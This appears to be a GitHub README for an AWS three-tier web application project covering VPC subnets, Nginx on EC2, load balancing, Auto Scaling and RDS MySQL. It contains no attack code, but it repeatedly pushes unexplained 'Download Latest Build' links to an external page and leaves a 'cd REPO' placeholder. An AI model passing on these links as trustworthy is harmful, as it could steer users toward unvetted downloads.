# AWS 3-Tier Web Application - Cloud Infrastructure Project 2026

> **A reference architecture on Amazon Web Services featuring VPC segmentation, Nginx web servers running on EC2, load balancing, Auto Scaling, and an Amazon RDS MySQL database.**

[![Platform](https://img.shields.io/badge/Platform-Amazon%20Web%20Services-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masonjfvcooper2321/aws-3tier-web-app?style=flat-square)](https://github.com/masonjfvcooper2321/aws-3tier-web-app)

---

<p align="center">
  <a href="https://masonjfvcooper2321.github.io/aws-3tier-web-app/">
    <img src="https://img.shields.io/badge/Download-AWS%203--Tier%20Web%20Application%20Latest-brightgreen?style=for-the-badge" alt="Download AWS 3-Tier Web Application">
  </a>
</p>

> **[Download AWS 3-Tier Web Application](https://masonjfvcooper2321.github.io/aws-3tier-web-app/)**

---

[Download Latest Build](https://masonjfvcooper2321.github.io/aws-3tier-web-app/)

---

## Project Overview

AWS 3-Tier Web Application demonstrates how to assemble a multi-layer web workload in Amazon Web Services. The design uses an Amazon VPC to separate public and private network responsibilities, combining EC2 web instances, an Application Load Balancer, Auto Scaling, and an Amazon RDS MySQL backend.

This project is useful for cloud, DevOps, and infrastructure learners exploring the delivery of a static HTML site from Ubuntu Linux through Nginx. It also offers hands-on context for studying security groups, instance observation, CPU-triggered scaling, and database-oriented application layouts.

---

## Included Capabilities

- Public and private subnets organized inside an Amazon VPC
- Security groups that manage access between cloud resources
- Ubuntu EC2 instances serving as web servers
- Nginx configuration for static HTML delivery
- Application Load Balancer support for distributing requests
- Amazon RDS MySQL database services for the backend
- Launch templates with CPU-driven Auto Scaling
- EC2 metrics monitoring and CPU stress-test exercises
- Hosting for a static HTML web application
- A layered setup appropriate for DevOps learning and practice

---

## Installation

Download the repository and enter its directory:

```bash
git clone https://github.com/masonjfvcooper2321/aws-3tier-web-app.git
cd REPO
```

Before provisioning anything in AWS, inspect the project files and deployment guidance. Configure the VPC, subnets, security groups, EC2 instances, load balancer, Auto Scaling resources, and RDS settings for the environment where the project will run.

Once the infrastructure has been created, place the HTML application on the configured Ubuntu web-server instances and verify that Nginx is delivering the site.

---

## Deployment Workflow

The following sequence describes a normal deployment:

1. Set up or inspect the Amazon VPC together with its public and private subnets.
2. Create access rules for the web, load-balancer, and database tiers through security groups.
3. Start Ubuntu EC2 web servers and install or configure Nginx.
4. Register the web servers behind an Application Load Balancer.
5. Create a launch template and enable CPU-based Auto Scaling.
6. Deploy an Amazon RDS MySQL instance for the backend tier.
7. Make the static HTML application available through the web servers.
8. Monitor the EC2 instances and perform CPU stress testing to observe scaling.

After the registered targets meet their configured health checks, visit the endpoint provided by the Application Load Balancer.

---

## Configuration

AWS-specific values should be checked and customized before deployment. The web, scaling, and database components should use compatible settings for items such as:

```text
AWS region
VPC and subnet selection
Security group rules
EC2 instance settings
Application Load Balancer targets
Auto Scaling thresholds
RDS MySQL connection parameters
Nginx site configuration
```

Do not commit database credentials or other environment-dependent values to the repository. Provide them through the deployment environment instead. CPU scaling and monitoring parameters can be tuned according to the capacity of the AWS account and the goals of the test workload.

---

## Requirements

- An Amazon Web Services account with access to the necessary services
- Amazon VPC networking
- Public and private subnets
- Amazon EC2
- Ubuntu Linux for web server instances
- Nginx
- Application Load Balancer
- Auto Scaling and launch templates
- Amazon RDS with MySQL
- Authorization to create and monitor the selected AWS resources
- A static HTML application for publication through the web tier

AWS resources can generate charges. Check the pricing information and regional resource limits before beginning the deployment.

---

## Frequently Asked Questions

### What audience is this project intended for?

The deployment is aimed at developers, cloud engineers, and DevOps learners who want to study a layered web application architecture on AWS.

### How do I open the deployed application?

After the web instances have been registered and are healthy, use the endpoint assigned to the Application Load Balancer.

### Where are deployment values customized?

Consult the repository deployment materials and the relevant AWS service settings. Adapt the region, network, EC2, Auto Scaling, Nginx, and RDS configuration to suit the target environment.

### What is the way to exercise Auto Scaling?

Use EC2 monitoring together with controlled CPU stress testing to produce a visible workload. Then examine the response from the configured CPU-based scaling policy.

### What can cause the website to remain unavailable?

Check the subnet assignments, security group permissions, EC2 instance condition, Nginx service configuration, load balancer target health, and the availability of the RDS MySQL tier.

### Where will project updates appear?

Review the repository for updated infrastructure files, application content, and deployment instructions.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
